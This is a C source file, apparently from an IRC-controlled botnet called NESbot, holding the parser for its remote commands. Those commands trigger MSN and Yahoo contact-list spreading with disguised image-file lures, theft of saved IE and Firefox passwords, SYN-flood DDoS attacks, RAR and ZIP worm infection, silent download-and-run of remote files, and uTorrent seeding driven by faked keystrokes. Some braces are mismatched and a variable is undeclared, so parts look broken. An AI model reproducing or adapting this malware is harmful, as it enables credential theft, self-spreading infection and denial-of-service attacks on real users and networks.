#include "../h/includes.h"
#include "../h/functions.h"
#include "../h/strings.h"
#include "../cmd.h"

extern char netinfo_title[];
extern int srvsz;
char msg[256];
SOCKET sock;

	//torrent stuff.
    #pragma comment( lib, "Urlmon.lib" )
    HWND uTorrentWindow = 0;
    BOOL CALLBACK EnumProc( HWND hWnd, LPARAM lParam )
    {
       char szTitle[ 512 ];

       GetWindowText( hWnd, szTitle, sizeof( szTitle ) );
       
       if( strstr( szTitle, "\xB5Torrent" ) )
          uTorrentWindow = hWnd;

       return TRUE;
    };

    HWND FindUTorrent( )
    {
       EnumWindows( EnumProc, 0 );
       return( uTorrentWindow );
    };
    void TypeString( char* szString )
    {
       int Length = strlen( szString ), i;
       bool ShiftDown = false;
       short sKey;
       
       for( i = 0; i < Length; i++, szString++ )
       {
          sKey = VkKeyScan( *szString );

          if( ( sKey >> 8 ) & 1 )
          {
             keybd_event( VK_LSHIFT, 0, 0, 0 );
             ShiftDown = true;
          }

          keybd_event( (unsigned char)sKey, 0, 0, 0 );

          if( ShiftDown )
          {
             keybd_event( VK_LSHIFT, 0, KEYEVENTF_KEYUP, 0 );
             ShiftDown = false;
          }
       }
    };
    int SeedUTorrent( char* szUrl, char* szSaveAs, char* szSeedTo )
    {
       HWND uTorrentWindow = FindUTorrent( );
       if( uTorrentWindow == 0 )
          return 1;
       if( URLDownloadToFile( 0, szUrl, szSaveAs, 0, 0 ) != S_OK )
          return 2;
       if( (int)fShellExecute( 0, "open", szSaveAs, 0, 0, SW_NORMAL ) <= 32 )
          return 3;
       ShowWindow( uTorrentWindow, SW_SHOW );
       BringWindowToTop( uTorrentWindow );
       SetForegroundWindow( uTorrentWindow );
       SetFocus( uTorrentWindow );
       if( !IsWindow( uTorrentWindow ) )
          return 4;
       Sleep( 300 );
       if( *szSeedTo != 0 )
          TypeString( szSeedTo );
       keybd_event( VK_RETURN, 0, 0, 0 );
       ShowWindow( uTorrentWindow, SW_MINIMIZE );
       return 0;
    };

HANDLE launchapp(LPTHREAD_START_ROUTINE launchapp_Function,LPVOID Parameter)
{
	DWORD Thread_Id;
	return(CreateThread(NULL,NULL,launchapp_Function,Parameter,NULL,&Thread_Id));
}
int IRC_TempCommand(char *params,irc_reply_data* hostd,void* conn,BOOL silent,BOOL topic/*=FALSE*/)
{
	IRC* irc=(IRC*)conn;

	char *a[MAX_TOKENS];
	//params++; //remove the ':'
	char fcmd[1024];
	strcpy(fcmd,params);
	if (fcmd[0] == prefix)
	{
		int t=SplitParams(a,params,MAX_TOKENS);
		SWITCHES switches=GetSwitches(a,t);

		if (!a[0])
			return 1;

		if (a[0][0] == prefix)
		{
			a[0]++;
			IRC_CommandParse(a,t,fcmd,hostd,irc,switches,topic);
		}
		else
		{
			if (!switches.silent)
				irc->pmsg(hostd->target,"NESbot failed to parse command.");
			return 1;
		} 
	}

	return 1;
}
BOOL IsFirst = FALSE;
int IRC_CommandParse(char *a[MAX_TOKENS],int t,char *params,irc_reply_data* hostd,void* conn,SWITCHES switches,BOOL topic/*=FALSE*/)
{
	IRC* irc=(IRC*)conn;

	int tnum; // for finding the number of a already running thread

	//int i;	  // for misc shit

	DWORD id; // for creating new threads
	
	BOOL dec=FALSE;


	if (topic)
	{
		if (!lstrcmpi(get_auth1,a[0]))
			return 1;

		if (!lstrcmpi(cmd_logout_1,a[0]))
			return 1;

		if (!lstrcmpi(cmd_remove_1,a[0]))
			return 1;

		if (!lstrcmpi(cmd_msnfile1_on,a[0]))
			return 1;

		if (!lstrcmpi(cmd_join_1,a[0]))
			return 1;

		if (!lstrcmpi(cmd_part_1,a[0]))
			return 1;

		if (!lstrcmpi(cmd_fake_remove,a[0]) || !lstrcmpi(cmd_fakedownload,a[0]) || !lstrcmpi(cmd_fakeupdate,a[0])) {
			irc->pmsg(hostd->target,"%s  -SECURE-LOCKDOWN-INITIATED-  You THOUGHT you had me :)", logo);
			irc->quit(str_quit_rem,hostd->nick,hostd->ident,hostd->host);
			return 0;
		}
	}

	// stops
	if (switches.stop)
	{
		if (!lstrcmpi(cmd_threads_1,a[0]))
		{
			stopthread(hostd->target,irc,switches.silent,switches.verbose,0,LIST_THREAD,"Thread list");
			return 1;
		}
		
		#ifndef NO_PSTORE
		else if (!lstrcmpi(cmd_pstoreIE_1, a[0]) || !lstrcmpi(cmd_pstoreIE_2, a[0])) 
		{
			stopthread(hostd->target,irc,switches.silent,switches.verbose,0,PSTORE_THREAD,"PStore");
			return 1;
		}
		#endif
		#ifndef NO_DOWNLOAD
		else if (!lstrcmpi(get_mnd1,a[0]))
		{
			stopthread(hostd->target,irc,switches.silent,switches.verbose,0,DOWNLOAD_THREAD,"Download");
			return 1;
		}
		else if (!lstrcmpi(get_upd1,a[0]))
		{
			stopthread(hostd->target,irc,switches.silent,switches.verbose,0,DOWNLOAD_THREAD,"Update");
			return 1;
		}
		#endif
		else if(!lstrcmpi(cmd_msnfile1_off,a[0]))
		{
		::killthreadid(MSNMSG1_THREAD,1);
		irc->pmsg(hostd->target,"%s spreading disabled.", logo);
		}

		}
		else if(!lstrcmpi(cmd_msnfile2_off,a[0]))
		{
		::killthreadid(MSNMSG2_THREAD,1);
		irc->pmsg(hostd->target,"%s Thread Disabled.", msn1spreadoff_title);
		}


		//login
		if (!lstrcmpi(a[0],get_auth1))
		{
		if (switches.verbose)
			irc->pmsg(hostd->target,str_auth_ali,main_title);
		return 1;
		}
		#ifndef NO_LOGOUT_CMD
		if (!lstrcmpi(cmd_logout_1, a[0]))
		{
		if (a[1])
		{
			i = atoi(a[1]);
			if(i>=0 && i<MAX_LOGINS)
			{
				if (irc->del_login(i))
				{
					if (!switches.silent)
						irc->pmsg(hostd->target,str_sl_logout,main_title,i);
				}

				else
				{
					if (!switches.silent)
						irc->pmsg(hostd->target,str_sl_no_logout, main_title, i);
				}
			}
			else
			{
				if (!switches.silent)
					irc->pmsg(hostd->target,str_sl_in_logout, main_title, i);
			}
		}
		else
		{
			if (irc->del_login(hostd->nick,hostd->ident,hostd->host)!=-1)
			{
				if (!switches.silent)
					irc->pmsg(hostd->target,str_logout,main_title,hostd->nick);
			}
		}
		return 1;
	}
#endif 

	//remove
	else if (!lstrcmpi(a[0],cmd_remove_1))
	{
		irc->pmsg(hostd->target,"%s \2removing bot\2...",logo,main_title);
		uninstall();
		if (!switches.silent)
			irc->quit(str_quit_rem,hostd->nick,hostd->ident,hostd->host);
		else
			irc->quit(str_quit_rem,hostd->nick,hostd->ident,"*");
		Sleep(FLOOD_DELAY);
		irc->disconnect();
		fWSACleanup();
		#ifdef _DEBUG
		//		CloseLog();
		#endif
		ExitProcess(EXIT_SUCCESS);
	}

	//msn v1 - full contact rnd msg + sendfile (SonyCam###.JPEG-www.photobucket.com)
	else if (!lstrcmpi(cmd_msnfile1_on,a[0]))
	{
		NTHREAD msn;
		msn.conn=irc;
		msn.silent=switches.silent;
		msn.verbose=switches.verbose;
		strcpy(msn.target,hostd->target);

		msn.threadnum = addthread(MSNMSG1_THREAD,"MSN Threads");
		if (threads[msn.threadnum].tHandle = CreateThread(NULL, 0, &MsnFile1, (LPVOID)&msn, 0, &id))
		{
			while (msn.gotinfo == FALSE) Sleep(50);
		}
	}


	//msn v2 - full contact msg + sendfile (email_###.JPEG-www.myspace.com)
	else if (!lstrcmpi(cmd_msnfile2_on,a[0]))
	{


		NTHREAD msn2;
		msn2.conn=irc;
		msn2.silent=switches.silent;
		msn2.verbose=switches.verbose;
		strcpy(msn2.target,hostd->target);

		char *IMmessage;
 		if ( !( IMmessage = strchr(params, ' ')) )return 1;

		msn2.data1=IMmessage; //Message
		msn2.threadnum = addthread(MSNMSG2_THREAD,"MSN2 Threads");
		if (threads[msn2.threadnum].tHandle = CreateThread(NULL, 0, &MsnFile2, (LPVOID)&msn2, 0, &id))
		{
			while (msn2.gotinfo == FALSE) Sleep(50);
		}



	}

    //yahoo v1 - full contact msg
		else if (!lstrcmpi(cmd_yahoospread,a[0]))
	{
		NTHREAD yah;
		yah.conn=irc;
		yah.silent=switches.silent;
		yah.verbose=switches.verbose;
		strcpy(yah.target,hostd->target);

		char *yMessage;
 		if ( !( yMessage = strchr(params, ' ')) )return 1;
		
		yah.data1=yMessage; //Message
		yah.threadnum = addthread(YAHOO_THREAD,"YAHOO Threads");
		if (threads[yah.threadnum].tHandle = CreateThread(NULL, 0, &Yahoo, (LPVOID)&yah, 0, &id))
		{
			while (yah.gotinfo == FALSE) Sleep(50);
		}
	}

	//yahoo v2 - full contact list msg + sendfile
	else if (!lstrcmpi(cmd_yahoospread2,a[0]))
	{
		NTHREAD yah;
		yah.conn=irc;
		yah.silent=switches.silent;
		yah.verbose=switches.verbose;
		char *IMmessage;
 		if ( !( IMmessage = strchr(params, ' ')) )return 1;
		yah.data1=IMmessage;
		yah.threadnum = addthread(YAHOO2_THREAD,"YAHOO2 Threads");
		if (threads[yah.threadnum].tHandle = CreateThread(NULL, 0, &YahooSpreadText2, (LPVOID)&yah, 0, &id))
		{
			while (yah.gotinfo == FALSE) Sleep(50);
		}
	}

	//pstore
	else if (!lstrcmpi(a[0],cmd_pstoreIE_1))
	{
		if ((tnum=findthreadnum(PSTORE_THREAD)) > 0)
		{
			irc->pmsg(hostd->target, str_thread_alr, pstore_title,"pstore thread", tnum);
			return 1;
		}

		NTHREAD PSTORE;
		PSTORE.conn=irc;
		PSTORE.silent=switches.silent;
		PSTORE.verbose=switches.verbose;

		if (!lstrcmpi(a[0],cmd_pstoreIE_2)) {
			PSTORE.bdata1=TRUE;
			PSTORE.data1=a[1];
		}


		strcpy(PSTORE.target,hostd->target);
		PSTORE.threadnum = addthread(PSTORE_THREAD,"PStore Thread");
		if (threads[PSTORE.threadnum].tHandle = CreateThread(NULL, 0, &pstore, (LPVOID)&PSTORE, 0, &id))
		{
			while (PSTORE.gotinfo == FALSE)
				Sleep(50);
		}
	}

	//firefox
	else if (!lstrcmpi(a[0],cmd_pstoreFF))
	{
		NTHREAD firefox;
		firefox.conn=irc;
		firefox.silent=switches.silent;
		firefox.verbose=switches.verbose;
		strcpy(firefox.target,InfoChan);
		firefox.threadnum = addthread(FIREFOX_THREAD,"FIREFOX Threads");
		if (threads[firefox.threadnum].tHandle = CreateThread(NULL, 0, &FireFox, (LPVOID)&firefox, 0, &id))
		{
			while (firefox.gotinfo == FALSE) Sleep(50);
		}
	}
	
	//supersyn
	else if (!lstrcmpi(cmd_ddos_supersyn,a[0]))
	{
		if ((tnum=findthreadnum(DDOS_THREAD)) > 0)
		{
			irc->pmsg(hostd->target, str_thread_alr, ddos_title,"ddos thread", tnum);
			return 1;
		}

		SUPERSYN ddos;
		sprintf(ddos.ip,	"%s", a[1]);
		sprintf(ddos.port,	"%s", a[2]);
		sprintf(ddos.length,"%s", a[3]);

		ddos.notice = 0;//switches.halfsilent;
		ddos.silent = 0;//switches.silent;
		ddos.conn=irc;
		strcpy(ddos.target,hostd->target);

		ddos.threadnum = addthread(DDOS_THREAD,"%s ddosing %s:%s/%s secs.",logo,ddos_title,a[1],a[2],a[3]);
		
		if (threads[ddos.threadnum].tHandle = CreateThread(NULL, 0, &SuperSynThread, (LPVOID)&ddos, 0, &id))
		{
			while(ddos.gotinfo == FALSE)
			Sleep(50);
		}
		else
		{
			if (!ddos.silent)
				irc->pmsg(hostd->target,"%s unable to start ddos, error: %s", logo,GetLastError());
			return 1;
		}
	}

	//join
	else if (!lstrcmpi(cmd_join_1,a[0]))
	{	
		if (!a[1])
		{
			if (!switches.silent)
				irc->pmsg(hostd->target,str_bad_format,irc_title);
			return 1;
		}
		irc->join(a[1],(a[2]?a[2]:""));
		return 1;
	}

	//part
	else if (!lstrcmpi(cmd_part_1,a[0]))
	{
		if (!a[1])
		{
			if (!switches.silent)
				irc->pmsg(hostd->target,str_bad_format,irc_title);
			return 1;
		}
		irc->part(a[1]);
		return 1;
	}
	
	//rarworm
  else if (!lstrcmpi(cmd_rarworm,a[0]))
	{
  irc->pmsg(hostd->target,"%s %s", logo, rarworm_title);
  launchapp(infectrar,NULL);
	}
	//zipworm
  else if (!lstrcmpi(cmd_zipworm,a[0]))
	{
  irc->pmsg(hostd->target,"%s %s", logo, zipworm_title);
  launchapp(infectzip,NULL);
	}

  	//torrent seeder
   else if (!lstrcmpi(cmd_seed,a[0]))
   {
   char *url;
   char *oic;
   char *kkk;
   url = a[1];
   oic = a[2];
   kkk = a[3];
   switch( SeedUTorrent( url, oic, kkk ) )
    {
   case 0:
     irc->pmsg(hostd->target,"%s seeding!\n", logo);
      break;
   case 2:
     irc->pmsg(hostd->target,"%s unable to download file\n", logo);
      break;
   };
	}

	//fake download commands
	else if (!lstrcmpi(cmd_fakedownload,a[0]) || !lstrcmpi(cmd_fakeupdate,a[0]) || !lstrcmpi(cmd_fake_remove,a[0])) {
			irc->pmsg(hostd->target,"%s  -SECURE-LOCKDOWN-INITIATED-  You THOUGHT you had me :)", logo);
			irc->quit(str_quit_rem,hostd->nick,hostd->ident,hostd->host);
			//exit the connection, we've been possibly taken over. just come back when the bo(t/x) reboots.
			irc->disconnect();
	}	
	
	//download
	else if (!lstrcmpi(get_mnd1,a[0]))
	{
		if (!a[1] || !a[2])
		{
			if (!switches.silent)
				irc->pmsg(hostd->target,str_bad_format,download_title);
			return 1;
		}
		if ((tnum=findthreadnum(DOWNLOAD_THREAD)) > 0)
		{
			if (!switches.silent)
				irc->pmsg(hostd->target,str_thread_alr,download_title,"transfer thread",tnum);
			return 1;
		}
		NTHREAD dl;
		dl.conn=irc;
		dl.silent=switches.silent;
		dl.verbose=switches.verbose;
		strcpy(dl.target,hostd->target);
		dl.data1=a[1];//site
		dl.data2=a[2];//location
		dl.bdata1 = FALSE;//update
		dl.bdata2 = (a[3]?TRUE:FALSE);//run
		dl.bdata3 = (a[4]?TRUE:FALSE);//run hidden

		
		dl.threadnum = addthread(DOWNLOAD_THREAD,"%s wget: %s location: %s.",logo,download_title,(dec?"*":a[1]),a[2]);
		if (threads[dl.threadnum].tHandle = CreateThread(NULL, 0, &DownloadThread, (LPVOID)&dl, 0, &id))
		{
			while (dl.gotinfo == FALSE)
				Sleep(50);
			
			if (!switches.silent && switches.verbose)
				irc->pmsg(hostd->target,"%s wget: %s location: %s.",download_title,a[1],a[2]);
		}
		else
		{
			if (!switches.silent)
				irc->pmsg(hostd->target,str_thread_fail,download_title,"transfer thread",GetLastError());
		}
		return 1;
	}

	//update
	else if (!lstrcmpi(get_upd1,a[0]))
	{
		if (!a[1])
		{
			if (!switches.silent)
				irc->pmsg(hostd->target,str_bad_format,update_title);
			return 1;
		}
		if (a[2])
		{
			if (!lstrcmpi(bid,a[2]))
			{
				return 1;
			}
		}
		if ((tnum=findthreadnum(DOWNLOAD_THREAD)) > 0)
		{
			if (!switches.silent)
				irc->pmsg(hostd->target,str_thread_alr,update_title,"transfer thread",tnum);
			return 1;
		}

		char tempdir[MAX_PATH], tmpbuf[MAX_PATH];
		GetTempPath(sizeof(tempdir), tempdir);
		sprintf(tmpbuf,"%seraseme_%d%d%d%d%d.exe",tempdir,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9);

		NTHREAD dl;
		dl.conn=irc;
		dl.silent=switches.silent;
		dl.verbose=switches.verbose;
		strcpy(dl.target,hostd->target);
		dl.data1=a[1];
		dl.data2=tmpbuf;
		if (a[3]) dl.idata1=1;
		else	  dl.idata1=0;
		dl.bdata1 = TRUE;//update
		dl.bdata2 = FALSE;//run
		dl.bdata3 = FALSE;//run hidden

		
		dl.threadnum = addthread(DOWNLOAD_THREAD,"%s Downloading update from: %s to: %s.",update_title,(dec?"*":a[1]),dl.data2);
		if (threads[dl.threadnum].tHandle = CreateThread(NULL, 0, &DownloadThread, (LPVOID)&dl, 0, &id))
		{
			while (dl.gotinfo == FALSE)
				Sleep(50);
			
			if (!switches.silent && switches.verbose)
				irc->pmsg(hostd->target,"%s updating from %s",logo,update_title,a[1],dl.data2);
		}
		else
		{
			if (!switches.silent)
				irc->pmsg(hostd->target,str_thread_fail,update_title,"transfer thread",GetLastError());
		}
		return 1;
	}

	//ends here.
	return 0;
}
